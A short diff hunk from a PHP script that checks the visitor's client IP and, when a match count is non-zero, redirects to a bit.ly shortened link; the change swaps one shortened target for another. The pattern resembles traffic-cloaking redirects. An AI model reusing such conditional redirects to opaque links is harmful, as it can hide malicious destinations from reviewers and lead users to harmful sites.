@@ -19,7 +19,7 @@ if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
 
     if(count($ifEx) > 0){
         
-        header ('Location:https://bit.ly/3njjYob');
+        header ('Location:https://bit.ly/3odBNpT');
 
     }else{
     
